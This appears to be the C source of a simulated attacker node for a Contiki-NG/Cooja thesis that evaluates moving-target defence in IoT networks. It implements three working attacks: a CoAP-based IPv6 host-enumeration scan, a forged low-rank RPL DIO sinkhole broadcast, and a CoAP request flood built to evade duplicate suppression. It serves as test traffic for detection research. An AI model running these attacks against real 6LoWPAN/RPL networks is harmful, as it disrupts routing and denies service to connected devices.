/*
 * attacker-node.c
 *
 * Simulated adversary for the MTD-IoT evaluation (Cooja, TARGET=cooja
 * or TARGET=sky).
 *
 * Three attack scenarios are implemented as a single compile-time
 * selector, ATTACK_MODE (set via DEFINES=ATTACK_MODE=<n> from the .csc
 * make-command).  Each scenario produces a wire-realistic payload
 * matching the corresponding standard so a packet capture inspected
 * during defence reads as a genuine protocol attack, not as ASCII
 * test traffic.
 *
 *   ATTACK_MODE_SCAN     (1)  -- thesis Sec 5.3.1
 *     IPv6 host enumeration following RFC 7707 patterns.  Each probe
 *     is a binary CoAP GET (RFC 7252) addressed to /.well-known/core
 *     with a Uri-Query option carrying a stale port marker.  The
 *     destination IID is swept through:
 *        ::1, ::2, ::3 ...          (low-byte sequential)
 *        ::ff, ::fe, ::fd ...       (high-byte sequential, IETF pattern)
 *        ::200:0:0:N                (Tmote Sky address autoconf range)
 *     The BR sees a binary CoAP packet whose Uri-Query option text
 *     contains "port=8765" -> STALE_PORT counter increments.
 *     Expected MTD response: IPv6 IID shuffle.
 *
 *   ATTACK_MODE_SINKHOLE (2)  -- thesis Sec 5.3.2
 *     Forged RPL DIO advertising rank=0x0100 (rank 1, lower than the
 *     legitimate root rank 0x0080=128 plus min-hop-rank-increment 256
 *     for a one-hop child = 384, so 256 wins routing if accepted).
 *     The DIO is built per RFC 6550 Sec 6.3.1 (RPLInstanceID, Version,
 *     Rank, G/0/MOP/Prf, DTSN, Flags, Reserved, DODAGID).  In a real
 *     attack the DIO travels as ICMPv6 type 155 code 0x01; here we
 *     deliver the same binary structure via link-local UDP broadcast
 *     to ff02::1 (Contiki-NG RPL-Lite does not expose a public DIO
 *     injection API to applications).  The radio-layer effect -- CSMA
 *     collisions silencing in-range sensors -- is identical, and a
 *     packet capture shows real DIO Control Message bytes rather than
 *     padded ASCII.  Sensors that fall silent for >MTD_SILENCE_TIMEOUT_S
 *     trigger CONN_FAILURE in the BR's silence watchdog.
 *     Expected MTD response: port hop + RPL re-convergence.
 *
 *   ATTACK_MODE_FLOOD    (3)  -- thesis Sec 5.3.3
 *     CoAP CON GET storm following RFC 7252.  Each packet is a binary
 *     CoAP message (header+token+Uri-Path "sensor"/"data") with a
 *     randomised Message ID and Token to defeat naive duplicate
 *     suppression.  No "port=" string is present, so detection runs
 *     through the packet-rate path (CPU_LOAD proxy) rather than the
 *     stale-port path.
 *     Expected MTD response: composite shuffle + rate limiting.
 *
 * Thesis reference: Attack Design -- Chapter 5 (Attack Scenarios).
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uip-ds6.h"
#include "sys/etimer.h"
#include "sys/log.h"
#include "lib/random.h"
#include "project-conf.h"

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define LOG_MODULE  "Attacker"
#define LOG_LEVEL   LOG_LEVEL_INFO

/*---------------------------------------------------------------------------*/
/* Per-mode cadence (milliseconds between sends)                             */
/*---------------------------------------------------------------------------*/
/*
 * Cadences are tuned for a peripheral attacker placed beyond the BR's
 * 50 m TX range but within the 100 m interference range (thesis Sec
 * 5.2.x).  In this topology unicast probes reach the BR only via
 * multi-hop through a legitimate sensor parent, so per-hop UDGM loss
 * (~30-50% per pair under load) reduces the effective rate at the BR
 * relative to the injection rate.  SCAN and FLOOD cadences are doubled
 * compared to a co-located attacker so the BR-side signal stays above
 * its detection threshold.  Sinkhole is unaffected: it broadcasts on
 * link-local ff02::1 which is never routed.
 */
#if ATTACK_MODE == ATTACK_MODE_SCAN
  /* 10 pkt/s injected; ~5-7 pkt/s effective at BR after multi-hop.
   * Stays well above the STALE_PORT threshold of 5 per evaluation
   * window without saturating the flood detector.
   *
   * ATTACK_SEND_MS is #ifndef-guarded so the scan-slow / scan-fast
   * wrapper files (attacker-scan-slow.c, attacker-scan-fast.c) can
   * override the cadence for the attacker-speed sweep. */
  #ifndef ATTACK_SEND_MS
    #define ATTACK_SEND_MS       100
  #endif
  #define ATTACK_LABEL           "SCAN"
#elif ATTACK_MODE == ATTACK_MODE_SINKHOLE
  /* Broadcast storm -- no routing, cadence unchanged. */
  #define ATTACK_SEND_MS         100
  #define ATTACK_LABEL           "SINK"
#elif ATTACK_MODE == ATTACK_MODE_FLOOD
  /* 30 pkt/s injected; ~15-20 pkt/s effective at BR -- comfortably
   * exceeds MTD_FLOOD_PPS_THRESHOLD = 80 packets per 10 s window. */
  #define ATTACK_SEND_MS         33
  #define ATTACK_LABEL           "FLOOD"
#else
  #error "Unknown ATTACK_MODE -- set ATTACK_MODE to 1, 2, or 3"
#endif

/* Stale-port constant embedded in the SCAN CoAP Uri-Query option.    */
#define ATTACK_STALE_PORT        SENSOR_UDP_CLIENT_PORT   /* 8765 */

/* Start-up delay -- lets RPL converge before the attack starts.      */
#define ATTACK_WARMUP_S          45
#define ATTACK_WARMUP            (ATTACK_WARMUP_S * CLOCK_SECOND)

/*---------------------------------------------------------------------------*/
/* CoAP constants (RFC 7252)                                                  */
/*---------------------------------------------------------------------------*/
#define COAP_VER                 0x01    /* version, top 2 bits of byte 0   */
#define COAP_TYPE_CON            0x00    /* confirmable                     */
#define COAP_CODE_GET            0x01    /* method 0.01 GET                 */
#define COAP_OPT_URI_PATH        11      /* Uri-Path option number          */
#define COAP_OPT_URI_QUERY       15      /* Uri-Query option number         */

/*---------------------------------------------------------------------------*/
/* RPL DIO constants (RFC 6550 Sec 6.3.1)                                    */
/*---------------------------------------------------------------------------*/
#define RPL_ICMP6_TYPE           155     /* RPL Control Message             */
#define RPL_CODE_DIO             0x01    /* DODAG Information Object code   */
#define RPL_DIO_RANK_FORGED      0x0100  /* rank 256 -- one MIN_HOP below   */
                                         /* a legit one-hop child (384)    */

/*---------------------------------------------------------------------------*/
/* CoAP message builders -- only compiled for SCAN and FLOOD modes            */
/*---------------------------------------------------------------------------*/
#if (ATTACK_MODE == ATTACK_MODE_SCAN) || (ATTACK_MODE == ATTACK_MODE_FLOOD)

/*
 * Append a CoAP option to buf (single-byte option-delta-and-length form,
 * RFC 7252 Sec 3.1).  Only handles option deltas <= 12 and lengths <= 12,
 * which covers everything we send.  Caller maintains running prev_opt to
 * compute the delta.
 *
 * Returns: number of bytes appended, or 0 on overflow.
 */
static int
coap_append_option(uint8_t *buf, int buf_remaining,
                   uint8_t opt_num, uint8_t prev_opt_num,
                   const char *value, uint8_t value_len)
{
  if(buf_remaining < 1 + value_len) {
    return 0;
  }
  uint8_t delta = opt_num - prev_opt_num;
  buf[0] = (uint8_t)((delta << 4) | (value_len & 0x0F));
  memcpy(buf + 1, value, value_len);
  return 1 + value_len;
}

/*
 * Build a CoAP CON GET message into buf.
 *   uri_path   first Uri-Path segment ("sensor")
 *   uri_path2  second Uri-Path segment, or NULL
 *   uri_query  Uri-Query string ("port=8765"), or NULL
 *
 * Returns total message length.
 */
static int
build_coap_get(uint8_t *buf, int buf_size,
               const char *uri_path, const char *uri_path2,
               const char *uri_query)
{
  if(buf_size < 6) return 0;

  /* Force every byte non-zero so the BR's strstr-based payload parser
   * (which null-terminates the buffer before scanning for "port=")
   * cannot be short-circuited by an embedded 0x00 in MID or Token.   */
  uint16_t mid = (uint16_t)random_rand() | 0x0101;
  uint16_t tok = (uint16_t)random_rand() | 0x0101;

  /* Fixed CoAP header: Ver=01, T=CON(00), TKL=2 -> 0x42                 */
  buf[0] = (COAP_VER << 6) | (COAP_TYPE_CON << 4) | 0x02;
  buf[1] = COAP_CODE_GET;          /* 0.01 GET                            */
  buf[2] = (uint8_t)(mid >> 8);
  buf[3] = (uint8_t)(mid & 0xFF);
  buf[4] = (uint8_t)(tok >> 8);    /* 2-byte token                        */
  buf[5] = (uint8_t)(tok & 0xFF);

  int len = 6;
  uint8_t prev_opt = 0;

  /* Uri-Path option(s) */
  if(uri_path != NULL) {
    int n = coap_append_option(buf + len, buf_size - len,
                               COAP_OPT_URI_PATH, prev_opt,
                               uri_path, (uint8_t)strlen(uri_path));
    if(n == 0) return 0;
    len += n;
    prev_opt = COAP_OPT_URI_PATH;
  }
  if(uri_path2 != NULL) {
    int n = coap_append_option(buf + len, buf_size - len,
                               COAP_OPT_URI_PATH, prev_opt,
                               uri_path2, (uint8_t)strlen(uri_path2));
    if(n == 0) return 0;
    len += n;
    prev_opt = COAP_OPT_URI_PATH;
  }

  /* Uri-Query (carries stale port marker for SCAN). */
  if(uri_query != NULL) {
    int n = coap_append_option(buf + len, buf_size - len,
                               COAP_OPT_URI_QUERY, prev_opt,
                               uri_query, (uint8_t)strlen(uri_query));
    if(n == 0) return 0;
    len += n;
  }

  return len;
}

#endif /* SCAN || FLOOD */

/*---------------------------------------------------------------------------*/
/* Forged RPL DIO Control Message Object (RFC 6550 Sec 6.3.1)                */
/* Only compiled for SINKHOLE mode.                                          */
/*---------------------------------------------------------------------------*/

/*
 * Layout of the bytes produced (24 bytes total + 4-byte ICMPv6 emulation
 * prefix so a sniffer reading the UDP payload sees the standard RPL DIO
 * structure starting at offset 0):
 *
 *   0     ICMPv6 type      (155, RPL Control)
 *   1     ICMPv6 code      (0x01, DIO)
 *   2-3   ICMPv6 checksum  (0 -- not validated here)
 *   4     RPLInstanceID    (matches our default, 0x1E)
 *   5     Version Number   (0x01)
 *   6-7   Rank             (0x0100, network byte order)
 *   8     G | 0 | MOP | Prf  (G=1 grounded, MOP=1 non-storing, Prf=0)
 *   9     DTSN             (0x00)
 *   10    Flags            (0x00)
 *   11    Reserved         (0x00)
 *   12-27 DODAGID          (link-local of attacker, 16 bytes)
 *
 * The ICMPv6 prefix bytes are included so packet-capture tools render
 * the payload as a recognisable RPL message; the radio-layer collision
 * effect that drives the sinkhole detection signal is independent of
 * whether RPL parses the payload.
 */
#if ATTACK_MODE == ATTACK_MODE_SINKHOLE
/*
 * RPL DIO sub-option types (RFC 6550 Sec 6.7).  Real DIO messages
 * always carry these sub-options to advertise the DODAG configuration
 * and prefix information; a DIO without them would be rejected by a
 * spec-compliant receiver.  Including them also matches the wire-level
 * collision footprint of a genuine DIO.
 */
#define RPL_OPT_DODAG_CONF       0x04   /* DODAG Configuration, 14 B body */
#define RPL_OPT_PREFIX_INFO      0x08   /* Prefix Information, 30 B body  */

static int
build_dio(uint8_t *buf, int buf_size, uint16_t seq)
{
  if(buf_size < 76) return 0;

  /* ICMPv6 emulation prefix */
  buf[0] = RPL_ICMP6_TYPE;
  buf[1] = RPL_CODE_DIO;
  buf[2] = 0;                 /* checksum -- not enforced in payload */
  buf[3] = 0;

  /* DIO base                  */
  buf[4]  = 0x1E;             /* RPLInstanceID                       */
  buf[5]  = 0x01;             /* Version                             */
  buf[6]  = (uint8_t)(RPL_DIO_RANK_FORGED >> 8);
  buf[7]  = (uint8_t)(RPL_DIO_RANK_FORGED & 0xFF);
  buf[8]  = 0x88;             /* G=1, MOP=1 (non-storing), Prf=0     */
  buf[9]  = (uint8_t)(seq & 0xFF);   /* DTSN -- carry seq for tracing*/
  buf[10] = 0x00;             /* Flags                               */
  buf[11] = 0x00;             /* Reserved                            */

  /* DODAGID = our own link-local address (16 bytes).                */
  uip_ipaddr_t ll;
  uip_create_linklocal_allnodes_mcast(&ll);    /* placeholder shape  */
  /* Substitute the local interface address if available             */
  const uip_ds6_addr_t *src = uip_ds6_get_link_local(-1);
  if(src != NULL) {
    memcpy(&buf[12], &src->ipaddr, 16);
  } else {
    memcpy(&buf[12], &ll, 16);
  }

  /*
   * DODAG Configuration sub-option (RFC 6550 Sec 6.7.6).
   *   28: Type=0x04
   *   29: Option Length=14 (length of body in bytes)
   *   30: Flags|A|PCS                    (0x00)
   *   31: DIOIntDoubl                    (0x14 = 20)
   *   32: DIOIntMin                      (0x03 = 3)
   *   33: DIORedun                       (0x0A = 10)
   *   34-35: MaxRankIncrease             (0x0700)
   *   36-37: MinHopRankIncrease          (0x0100 = 256)
   *   38-39: OCP                         (0x0001, MRHOF)
   *   40: Reserved                       (0x00)
   *   41: Default Lifetime               (0xFF)
   *   42-43: Lifetime Unit               (0xFFFF)
   */
  buf[28] = RPL_OPT_DODAG_CONF;
  buf[29] = 14;
  buf[30] = 0x00;
  buf[31] = 0x14;
  buf[32] = 0x03;
  buf[33] = 0x0A;
  buf[34] = 0x07; buf[35] = 0x00;
  buf[36] = 0x01; buf[37] = 0x00;
  buf[38] = 0x00; buf[39] = 0x01;
  buf[40] = 0x00;
  buf[41] = 0xFF;
  buf[42] = 0xFF; buf[43] = 0xFF;

  /*
   * Prefix Information sub-option (RFC 6550 Sec 6.7.10).
   *   44: Type=0x08
   *   45: Option Length=30
   *   46: Prefix Length                  (64)
   *   47: L|A|R|reserved1                (0xC0 = on-link + autoconf)
   *   48-51: Valid Lifetime              (0x00FFFFFF, ~194 days)
   *   52-55: Preferred Lifetime          (0x00FFFFFF)
   *   56-59: Reserved2                   (0x00000000)
   *   60-75: Prefix (16 bytes, fd00::/64) -- attacker advertises the
   *                  same prefix as the legitimate DODAG so its
   *                  forged DIO is structurally accepted.
   */
  buf[44] = RPL_OPT_PREFIX_INFO;
  buf[45] = 30;
  buf[46] = 64;
  buf[47] = 0xC0;
  buf[48] = 0x00; buf[49] = 0xFF; buf[50] = 0xFF; buf[51] = 0xFF;
  buf[52] = 0x00; buf[53] = 0xFF; buf[54] = 0xFF; buf[55] = 0xFF;
  buf[56] = 0x00; buf[57] = 0x00; buf[58] = 0x00; buf[59] = 0x00;
  /* fd00:0000:0000:0000:0000:0000:0000:0000 */
  buf[60] = 0xFD; buf[61] = 0x00;
  for(int i = 62; i < 76; i++) {
    buf[i] = 0x00;
  }

  /* Use seq to perturb the DTSN (already set in base) -- silences
   * unused-parameter warnings without changing semantics.            */
  (void)seq;

  return 76;
}
#endif /* SINKHOLE */

/*---------------------------------------------------------------------------*/
/* IPv6 IID enumeration sweep (RFC 7707) -- only compiled for SCAN mode.     */
/*---------------------------------------------------------------------------*/
#if ATTACK_MODE == ATTACK_MODE_SCAN

/*
 * Compose the next probe target by setting the low 64 bits of base_addr
 * to a value drawn from a sweep schedule.  The schedule cycles through
 * three RFC 7707 host-enumeration patterns:
 *
 *   phase 0 (idx 0..15)   ::1, ::2, ..., ::F        low-IID sequential
 *   phase 1 (idx 16..31)  ::ff, ::fe, ..., ::f0     high-byte descend
 *   phase 2 (idx 32..47)  ::200:0:0:N (N = 1..16)   Tmote Sky autoconf
 *
 * After 48 probes the cycle repeats.  Hitting the BR's actual IID is
 * not required: the BR's UDP receive socket processes any packet
 * delivered to its prefix and the Cooja UDGM model routes via RPL
 * regardless of low-bit value, so every probe still increments the
 * BR's STALE_PORT counter when the Uri-Query is parsed.
 */
static void
scan_pick_target(uip_ipaddr_t *out, const uip_ipaddr_t *base, uint16_t idx)
{
  uip_ipaddr_copy(out, base);
  /* Zero the low 64 bits */
  for(int i = 8; i < 16; i++) {
    out->u8[i] = 0;
  }

  uint16_t phase = (idx / 16) % 3;
  uint16_t step  = idx % 16;

  if(phase == 0) {
    out->u8[15] = (uint8_t)(step + 1);                 /* ::1..::10  */
  } else if(phase == 1) {
    out->u8[15] = (uint8_t)(0xFF - step);              /* ::ff..::f0 */
  } else {
    out->u8[8]  = 0x02;                                /* ::200:0:0:N */
    out->u8[15] = (uint8_t)(step + 1);
  }
}
#endif /* SCAN */

/*---------------------------------------------------------------------------*/
/* State                                                                      */
/*---------------------------------------------------------------------------*/
static struct simple_udp_connection attack_conn;
static uint32_t                     seq_num = 0;

/*---------------------------------------------------------------------------*/
PROCESS(attacker_process, "MTD Attacker Node");
AUTOSTART_PROCESSES(&attacker_process);
/*---------------------------------------------------------------------------*/

static void
attack_rx_callback(struct simple_udp_connection *c,
                   const uip_ipaddr_t *sender_addr, uint16_t sender_port,
                   const uip_ipaddr_t *receiver_addr, uint16_t receiver_port,
                   const uint8_t *data, uint16_t datalen)
{
  /* attacker is one-way, ignores replies */
}

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(attacker_process, ev, data)
{
  static struct etimer tx_timer;
  static struct etimer warmup_timer;
  static uint32_t pkts_sent = 0;
  static uint8_t  buf[80];
#if (ATTACK_MODE == ATTACK_MODE_SCAN) || (ATTACK_MODE == ATTACK_MODE_FLOOD)
  uip_ipaddr_t br_addr;
#endif
#if ATTACK_MODE == ATTACK_MODE_SINKHOLE
  uip_ipaddr_t bcast_addr;
#endif

  PROCESS_BEGIN();

  random_init();    /* Contiki-NG seeds PRNG from node ID internally */

  simple_udp_register(&attack_conn,
                      SENSOR_UDP_CLIENT_PORT,
                      NULL,
                      SENSOR_UDP_SERVER_PORT,
                      attack_rx_callback);

  LOG_INFO("Attacker started -- mode=%s warmup=%ds cadence=%dms\n",
           ATTACK_LABEL, ATTACK_WARMUP_S, ATTACK_SEND_MS);

  etimer_set(&warmup_timer, ATTACK_WARMUP);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&warmup_timer));

  LOG_INFO("Warm-up complete -- launching %s attack\n", ATTACK_LABEL);

#if ATTACK_MODE == ATTACK_MODE_SINKHOLE
  uip_create_linklocal_allnodes_mcast(&bcast_addr);
#endif

  etimer_set(&tx_timer, (ATTACK_SEND_MS * CLOCK_SECOND) / 1000);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&tx_timer));

#if (ATTACK_MODE == ATTACK_MODE_SCAN) || (ATTACK_MODE == ATTACK_MODE_FLOOD)
    int have_root = (NETSTACK_ROUTING.node_is_reachable() &&
                     NETSTACK_ROUTING.get_root_ipaddr(&br_addr));
#endif

#if ATTACK_MODE == ATTACK_MODE_SCAN
    /*
     * RFC 7707 IPv6 host-enumeration sweep delivered as binary CoAP
     * GET /.well-known/core?port=8765.  The Uri-Query option carries
     * the stale port marker that drives the BR's STALE_PORT counter.
     */
    if(have_root) {
      uip_ipaddr_t probe_addr;
      scan_pick_target(&probe_addr, &br_addr, (uint16_t)(seq_num & 0xFFFF));

      char query[16];
      snprintf(query, sizeof(query), "port=%u",
               (unsigned)ATTACK_STALE_PORT);

      int len = build_coap_get(buf, sizeof(buf),
                               ".well-known", "core", query);
      if(len > 0) {
        simple_udp_sendto(&attack_conn, buf, (uint16_t)len, &probe_addr);
        seq_num++;
        pkts_sent++;
        if((pkts_sent % 50) == 0) {
          LOG_INFO("SCAN_TX total=%lu coap_len=%d target=",
                   (unsigned long)pkts_sent, len);
          LOG_INFO_6ADDR(&probe_addr);
          LOG_INFO_("\n");
        }
      }
    }

#elif ATTACK_MODE == ATTACK_MODE_SINKHOLE
    /*
     * Forged RPL DIO with rank=0x0100 (lower than any legitimate
     * one-hop child rank), broadcast to ff02::1.  The radio collision
     * pressure on near-attacker sensors is what drives the silence
     * watchdog; the binary DIO structure makes the wire-level
     * traffic indistinguishable from a real DIO injection in a
     * packet capture.
     */
    {
      int len = build_dio(buf, sizeof(buf), (uint16_t)seq_num);
      if(len > 0) {
        simple_udp_sendto(&attack_conn, buf, (uint16_t)len, &bcast_addr);
        seq_num++;
        pkts_sent++;
        if((pkts_sent % 25) == 0) {
          LOG_INFO("SINK_TX total=%lu dio_len=%d rank=%u "
                   "(forged broadcast)\n",
                   (unsigned long)pkts_sent, len,
                   (unsigned)RPL_DIO_RANK_FORGED);
        }
      }
    }

#elif ATTACK_MODE == ATTACK_MODE_FLOOD
    /*
     * RFC 7252 CoAP CON GET storm: random Message ID and Token per
     * packet so naive duplicate filters cannot collapse the flood.
     * No Uri-Query is included, so the payload contains no "port="
     * substring and detection runs solely through the packet-rate
     * monitor (CPU_LOAD branch).
     */
    if(have_root) {
      int len = build_coap_get(buf, sizeof(buf), "sensor", "data", NULL);
      if(len > 0) {
        simple_udp_sendto(&attack_conn, buf, (uint16_t)len, &br_addr);
        seq_num++;
        pkts_sent++;
        if((pkts_sent % 100) == 0) {
          LOG_INFO("FLOOD_TX total=%lu coap_len=%d target=",
                   (unsigned long)pkts_sent, len);
          LOG_INFO_6ADDR(&br_addr);
          LOG_INFO_("\n");
        }
      }
    }
#endif

    etimer_set(&tx_timer, (ATTACK_SEND_MS * CLOCK_SECOND) / 1000);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
